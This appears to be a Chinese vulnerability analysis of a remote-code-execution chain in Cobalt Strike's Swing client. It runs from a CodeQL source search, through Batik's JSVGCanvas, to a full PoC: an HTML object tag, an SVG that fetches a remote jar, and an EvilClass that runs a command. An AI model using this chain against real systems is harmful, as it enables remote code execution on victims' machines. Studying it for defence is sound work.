codeql查找合适的source
```java
class SourceMethod extends Method {
    SourceMethod() {
        (
            this instanceof SetterMethod or 
            getName().matches("set%")
        )
        and getNumberOfParameters() = 1 
        and getParameter(0).getType().hasName("String")
        and getDeclaringType().getAnAncestor().hasQualifiedName("java.awt","Component")
    }
}

from Method m 
where m instanceof SourceMethod
select m
```

得到结果
```shell
1	setTeamServerAlias
2	setPort
3	setServerNameString
4	setServerHostName
5	setBeaconID
6	setStyle
7	setPrompt
8	setDefaultPrompt
9	setTextDirect
10	setText
11	setAutoLayout
12	setActionCommand
13	setLabel
14	setLabel
15	setName
16	setTitle
17	setFile
18	setDirectory
19	setTitle
20	setTitle
21	setText
22	setText
23	setText
24	setLabel
25	setActionCommand
26	setText
27	setActionCommand
28	setToolTipText
29	setText
30	setContentType
31	setPage
32	setApproveButtonText
33	setApproveButtonToolTipText
34	setDialogTitle
35	setTitle
36	setText
37	setText
38	setLabel
39	setString
40	setActionCommand
41	setTipText
42	setText
43	setMainMessage
44	setMessage
45	setURI
46	setFragmentIdentifier
47	setMedia
48	setText
49	setLanguages
50	setLanguages
51	setText
52	setPath
53	setPath
54	setText
55	setStatus
56	setDocumentURL
57	setStyleURL
58	set
59	setActionCommand
```

漏洞入口点
```java
public void setURI(String var1) {
      String var2 = this.uri;
      this.uri = var1;
      if (this.uri != null) {
         this.loadSVGDocument(this.uri);
      } else {
         this.setSVGDocument((SVGDocument)null);
      }

      this.pcs.firePropertyChange("URI", var2, this.uri);
   }
```

SVG ----> JS ----> Java Code，`org.apache.batik.bridge.BaseScriptingEnvironment.loadScript`中最后有这行可以执行代码
```java
// 有两种interpreter， RhinoInterpreter、JPythonInterpreter，所以理论上可以执行java和python代码，但是cs里没有这两个的依赖包，无法执行
interpreter.evaluate(reader, desc);
```

实际漏洞点，jar远程加载
```java
// org.apache.batik.bridge.BaseScriptingEnvironment.loadScript

if (type.equals(SVGConstants.SVG_SCRIPT_TYPE_JAVA)) { // application/java-archive
            try {
                String href = XLinkSupport.getXLinkHref(script);
                ParsedURL purl = new ParsedURL(script.getBaseURI(), href);

                checkCompatibleScriptURL(type, purl); // 需要加载svg和jar包的地址一样

                DocumentJarClassLoader cll;
                URL docURL = null;
                try {
                    docURL = new URL(docPURL.toString());
                } catch (MalformedURLException mue) {
                    /* nothing just let docURL be null */
                }
                cll = new DocumentJarClassLoader
                    (new URL(purl.toString()), docURL);

                // Get the 'Script-Handler' entry in the manifest.
                URL url = cll.findResource("META-INF/MANIFEST.MF"); // 打包的jar包中META-INF/MANIFEST.MF需要指定加载的恶意类
                if (url == null) {
                    return;
                }
                Manifest man = new Manifest(url.openStream());

                String sh;

                executedScripts.put(script, null);

                sh = man.getMainAttributes().getValue("Script-Handler");
                if (sh != null) {
                    // Run the script handler.
                    ScriptHandler h;
                    h = (ScriptHandler)cll.loadClass(sh).newInstance();
```

poc
```java
new JLabel("<html><object classid='org.apache.batik.swing.JSVGCanvas'><param name='URI' value='http://127.0.0.1:9999/1.svg'></object>");
```

SVG文件
```html
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009901" stroke="#004400"/>
<script type="application/java-archive" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="http://127.0.0.1:9999/1.jar">
</script>
</svg>
```

恶意类
```java
public class EvilClass {
    static{
        try{
            Runtime.getRuntime().exec("open -a Calculator");
        }catch (Exception e){

        }
    }
    public EvilClass(){

    }
}
```

MANIFEST.MF
```shell
➜  cs_rce_jar cat META-INF/MANIFEST.MF
Manifest-Version: 1.0
Script-Handler: EvilClass
```

调用栈
```java
exec:348, Runtime (java.lang)
<clinit>:4, EvilClass
newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
newInstance:423, Constructor (java.lang.reflect)
newInstance:442, Class (java.lang)
loadScript:423, BaseScriptingEnvironment (org.apache.batik.bridge)
loadScripts:355, BaseScriptingEnvironment (org.apache.batik.bridge)
dispatchSVGLoadEvent:238, UpdateManager (org.apache.batik.bridge)
dispatchSVGLoadEvent:220, UpdateManager (org.apache.batik.bridge)
run:100, SVGLoadEventDispatcher (org.apache.batik.swing.svg)
```


